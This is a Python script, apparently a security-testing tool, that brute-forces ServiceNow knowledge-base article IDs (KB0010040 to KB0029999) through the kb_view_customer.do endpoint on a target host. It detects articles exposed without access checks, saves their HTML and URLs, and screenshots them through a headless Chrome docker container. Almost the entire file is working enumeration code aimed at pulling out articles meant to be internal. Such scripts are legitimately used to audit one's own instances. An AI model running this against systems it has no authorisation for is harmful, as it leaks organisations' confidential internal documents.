#!/usr/bin/env python
#
# 
#
# service-now.py - Finding paths KB articles that should only be internal
#
# By @RandomRobbieBF
# 
#

import requests
import sys
import argparse
import time
import os
from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()



parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True ,default="my.service-now.com",help="URL to test - no need for https://")
parser.add_argument("-p", "--proxy",required=False, help="Proxy for debugging")

args = parser.parse_args()
url = args.url
proxy = args.proxy

if proxy:
	http_proxy = proxy
else:
	http_proxy = ""



proxyDict = { 
              "http"  : http_proxy, 
              "https" : http_proxy, 
              "ftp"   : http_proxy
            }
  
  
def test_url(url,i):
	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept":"*/*"}
	try:
		newurl = "https://"+url+"/kb_view_customer.do?sysparm_article=KB00"+str(i)+""
		response = session.get(newurl, headers=headers,verify=False, proxies=proxyDict,timeout=30)
		if response.status_code == 200:
			if "1 out of 5 Star Rating" in response.text:
				if "INSUFFICIENT ROLES TO VIEW PROTECTED ARTICLE" not in response.text:
					if "ARTICLE NOT FOUND" not in response.text:
						if not os.path.exists(""+url+""):
							os.mkdir(""+url+"")
						print("[+] Found article for KB00"+str(i)+" [+]")
						# Create a list of url that we can access
						text_file = open(""+url+"/found-"+url+".txt", "a")
						text_file.write(""+newurl+"\n")
						text_file.close()
						
						# Create a text file of the HTML for grepping later
						text_file = open(""+url+"/KB00"+str(i)+".txt", "a")
						text_file.write(response.text)
						text_file.close()
						
						# Screenshots to maybe help review whats there and evidence.
						driver = webdriver.Remote('http://127.0.0.1:4444',DesiredCapabilities.CHROME)  
						driver.get(newurl)
						driver.set_window_size(1290, 1080)
						driver.save_screenshot(""+url+"/KB00"+str(i)+".png")
						driver.close()
					else:
						print("[-] No Luck for KB00"+str(i)+" [-]")
			else:
				print("[-] No Luck for KB00"+str(i)+" [-]")
		else:
			print("[-] No Luck for KB00"+str(i)+" [-]")
	except Exception as e:
		print('Error: %s' % e)
		print ("[-]Check Url might have Issues[-]")
		sys.exit(0)
try:
	os.system("docker run --name screenshotter -d --rm -p:4444:4444 txt3rob/headless-chromedriver")		
	for i in range(10040,30000):
		test_url(url,i)
	os.system("docker stop screenshotter")
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		os.system("docker stop screenshotter")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		os.system("docker stop screenshotter")
		sys.exit(1)
